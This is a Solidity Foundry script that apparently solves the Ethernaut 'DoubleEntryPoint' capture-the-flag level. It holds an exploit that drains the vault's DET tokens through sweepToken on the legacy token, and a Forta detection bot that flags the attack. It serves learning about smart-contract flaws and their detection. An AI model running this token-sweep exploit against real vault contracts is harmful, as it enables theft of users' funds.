// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import "../instance/Level26.sol";
import "forge-std/Script.sol";

// EXPLOIT SCRIPT //
////////////////////

contract ExploitLeve26 is Script {
    DoubleEntryPoint instance = DoubleEntryPoint(0x6D828583B24f3420853E05BA6f05cd9775b90049);

    function run() external {
        CryptoVault vaultContract = CryptoVault(instance.cryptoVault());
        IERC20 tokenDET = vaultContract.underlying(); // IERC20(address(instance))
        IERC20 tokenLGT = IERC20(instance.delegatedFrom());

        console.log("CryptoVault balance of DET before:", tokenDET.balanceOf(address(vaultContract)));

        vm.broadcast(vm.envUint("PRIVATE_KEY"));
        vaultContract.sweepToken(tokenLGT);

        console.log("CryptoVault balance of DET: after", tokenDET.balanceOf(address(vaultContract)));
    }
}

// FORZA BOT //
///////////////

contract Bot is IDetectionBot {
    address private cryptoVault;

    constructor(address _cryptoVault) public {
        cryptoVault = _cryptoVault;
    }

    function handleTransaction(address user, bytes calldata msgData) external override {
        address origSender;
        assembly {
            origSender := calldataload(0xa8)
        }

        if (origSender == cryptoVault) {
            IForta(msg.sender).raiseAlert(user);
        }
    }
}

contract DeployBot is Script {
    DoubleEntryPoint instance = DoubleEntryPoint(0x6D828583B24f3420853E05BA6f05cd9775b90049);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        CryptoVault vaultContract = CryptoVault(instance.cryptoVault());
        Bot botContract = new Bot(address(vaultContract));
        instance.forta().setDetectionBot(address(botContract));

        vm.stopBroadcast();
    }
}
